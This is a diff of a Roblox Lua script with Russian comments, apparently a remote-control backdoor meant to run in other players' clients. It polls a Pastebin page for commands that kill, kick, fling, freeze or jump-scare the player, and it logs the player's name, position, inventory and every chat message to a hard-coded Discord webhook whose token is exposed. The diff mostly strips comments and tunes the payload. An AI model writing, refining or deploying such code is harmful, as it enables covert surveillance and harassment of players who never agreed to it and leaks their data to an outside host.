@@ -1,48 +1,43 @@
 -- [[ CONFIG ]] --
 local settings = {
-    -- Твой Discord Webhook для получения логов и чата
     webhook = "https://discord.com/api/webhooks/1464946131971604502/BeusAylciHGUFqcIyOsrQdymegpkb37kW7arx9zsxVX51An6GWXTSNFJXm0C-KWadIKT",
-    -- Ссылка на Pastebin (в формате RAW), где ты пишешь команды
     control = "https://pastebin.com/raw/EsjZSDrA",
-    -- Как часто проверять команды (в секундах)
-    check_delay = 1
+    check_delay = 2 -- Оптимально 2 секунды для стабильности
 }
 
 -- [[ SERVICES ]] --
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService") -- ИСПРАВЛЕНО: Убран пробел (был "HTTP Service")
+local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Debris = game:GetService("Debris")
 local lp = Players.LocalPlayer
 
 -- [[ FUNCTIONS ]] --
 
--- Универсальная функция запроса для разных экзекуторов
 local function requestFunc(options)
     local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
     if fn then return fn(options) end
 end
 
--- Сбор списка предметов в инвентаре и в руках
 local function getInventory()
     local tools = {}
-    local backpack = lp:FindFirstChild("Backpack")
-    local char = lp.Character
-    
-    if backpack then
-        for _, v in ipairs(backpack:GetChildren()) do
-            if v:IsA("Tool") then table.insert(tools, v.Name) end
+    pcall(function()
+        local backpack = lp:FindFirstChild("Backpack")
+        local char = lp.Character
+        if backpack then
+            for _, v in ipairs(backpack:GetChildren()) do
+                if v:IsA("Tool") then table.insert(tools, v.Name) end
+            end
         end
-    end
-    if char then
-        for _, v in ipairs(char:GetChildren()) do
-            if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end
+        if char then
+            for _, v in ipairs(char:GetChildren()) do
+                if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end
+            end
         end
-    end
+    end)
     return #tools > 0 and table.concat(tools, ", ") or "Empty"
 end
 
--- Отправка красивых логов в Discord
 local function sendLog(title, desc, color)
     task.spawn(function()
         local pos = "Unknown"
@@ -59,12 +54,11 @@ local function sendLog(title, desc, color)
                 ["description"] = desc,
                 ["color"] = color or 0xFF0000,
                 ["fields"] = {
-                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. " (" .. lp.UserId .. ")`", ["inline"] = true},
-                    {["name"] = "🎮 Игра", ["value"] = "[Link](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
-                    {["name"] = "📍 Координаты", ["value"] = "`" .. pos .. "`", ["inline"] = true},
+                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. "`", ["inline"] = true},
+                    {["name"] = "📍 Позиция", ["value"] = "`" .. pos .. "`", ["inline"] = true},
                     {["name"] = "🎒 Инвентарь", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
                 },
-                ["footer"] = {["text"] = "AxM v38 Cleaned • " .. os.date("%X")}
+                ["footer"] = {["text"] = "AxM v39 Fixed • " .. os.date("%X")}
             }}
         }
 
@@ -82,81 +76,79 @@ task.spawn(function()
     local last_cmd = ""
     local flingConnection
     
-    -- Получаем текущее содержимое Pastebin при запуске
-    pcall(function()
-        local res = game:HttpGet(settings.control .. "?t=" .. tick())
-        last_cmd = res:gsub("%s+", ""):lower()
-    end)
-
     while true do
         task.wait(settings.check_delay)
         
-        -- Попытка прочитать команду из Pastebin
+        -- nocache=tick() заставляет Pastebin выдавать новый текст
         local ok, res = pcall(function() 
-            return game:HttpGet(settings.control .. "?nocache=" .. tick()) 
+            return game:HttpGet(settings.control .. "?nocache=" .. tick() .. "&t=" .. os.time()) 
         end)
 
         if ok and res then
-            local clean_res = res:match("^%s*(.-)%s*$") -- Убираем лишние пробелы по бокам
+            local clean_res = res:match("^%s*(.-)%s*$") or ""
             local current_cmd = clean_res:lower()
 
-            -- Если появилась новая команда (и это не "safe")
-            if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
+            -- Если команда "safe", сбрасываем историю и ничего не делаем
+            if current_cmd == "safe" or current_cmd == "" then
+                last_cmd = "" 
+            -- Если пришла новая команда
+            elseif current_cmd ~= last_cmd then
                 last_cmd = current_cmd
                 
                 local char = lp.Character
                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
                 local hum = char and char:FindFirstChildOfClass("Humanoid")
 
-                -- Обработка команд
+                -- БЛОК ИСПОЛНЕНИЯ
                 if current_cmd == "kill" and hum then
                     hum.Health = 0
-                    sendLog("💀 КИЛЛ", "Ликвидирован.")
+                    sendLog("💀 КИЛЛ", "Убит через панель")
 
                 elseif current_cmd:find("message") then
-                    local msg = clean_res:match("%((.-)%)") or "System"
+                    local msg = clean_res:match("%((.-)%)") or "System Message"
                     local g = Instance.new("ScreenGui", lp.PlayerGui)
                     local t = Instance.new("TextLabel", g)
                     t.Size = UDim2.new(1,0,0.1,0); t.Position = UDim2.new(0,0,0.45,0)
                     t.Text = msg; t.TextScaled = true; t.BackgroundColor3 = Color3.new(0,0,0)
                     t.TextColor3 = Color3.new(1,1,1); t.BackgroundTransparency = 0.5
-                    Debris:AddItem(g, 5)
-                    sendLog("📢 MSG", "Текст: " .. msg, 0x00FF00)
+                    Debris:AddItem(g, 7)
+                    sendLog("📢 СООБЩЕНИЕ", "Текст: " .. msg, 0x00FF00)
 
                 elseif current_cmd == "screamer" then
                     local s = Instance.new("Sound", workspace)
                     s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
-                    Debris:AddItem(s, 5)
                     local g = Instance.new("ScreenGui", lp.PlayerGui)
                     local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
-                    Debris:AddItem(g, 3)
-                    sendLog("😱 СКРИМЕР", "Бу!")
+                    Debris:AddItem(s, 5); Debris:AddItem(g, 3)
+                    sendLog("😱 СКРИМЕР", "Отправлен игроку")
 
                 elseif current_cmd:find("kick") then
-                    local r = clean_res:match("%((.-)%)") or "Disconnected"
-                    sendLog("🚪 КИК", "Причина: " .. r, 0xFFFF00)
-                    task.wait(0.3)
-                    lp:Kick(r)
+                    local reason = clean_res:match("%((.-)%)") or "Connection Lost"
+                    sendLog("🚪 КИК", "Причина: " .. reason, 0xFFFF00)
+                    task.wait(0.5)
+                    lp:Kick(reason)
 
                 elseif current_cmd == "fling" and hrp then
                     if flingConnection then flingConnection:Disconnect() end
                     flingConnection = RunService.Heartbeat:Connect(function()
-                        hrp.Velocity = Vector3.new(0, 5000, 0)
-                        hrp.RotVelocity = Vector3.new(0, 5000, 0)
+                        if hrp and hrp.Parent then
+                            hrp.Velocity = Vector3.new(0, 8000, 0) -- Мощный флинг
+                            hrp.RotVelocity = Vector3.new(0, 8000, 0)
+                        end
                     end)
-                    sendLog("🌪️ ФЛИНГ", "Включен")
+                    sendLog("🌪️ ФЛИНГ", "Активирован", 0xFF00FF)
 
                 elseif current_cmd == "unfling" then
                     if flingConnection then flingConnection:Disconnect() end
-                    sendLog("🛡️ УНФЛИНГ", "Выключен")
+                    sendLog("🛡️ УНФЛИНГ", "Остановлено")
 
                 elseif current_cmd == "freeze" and hrp then
                     hrp.Anchored = true
-                    sendLog("🧊 ФРИЗ", "Заморожен")
+                    sendLog("🧊 ФРИЗ", "Игрок застыл")
 
                 elseif current_cmd == "unfreeze" and hrp then
                     hrp.Anchored = false
-                    sendLog("🔥 УНФРИЗ", "Разморожен")
+                    sendLog("🔥 УНФРИЗ", "Игрок разморожен")
                 end
             end
         end
@@ -164,10 +156,8 @@ task.spawn(function()
 end)
 
 -- [[ CHAT SPY ]] --
--- Отслеживание всех сообщений игрока в чате
 lp.Chatted:Connect(function(m) 
-    sendLog("💬 ЧАТ", "```" .. m .. "```", 0x3498DB) 
+    sendLog("💬 ЧАТ", "Сообщение: `" .. m .. "`", 0x3498DB) 
 end)
 
--- Начальный лог о запуске
-sendLog("🛰️ СИСТЕМА", "Скрипт запущен. Ожидание команд...", 0x00FF00)
+sendLog("🛰️ СИСТЕМА", "Скрипт готов. Используй Pastebin для команд.", 0x00FF00)
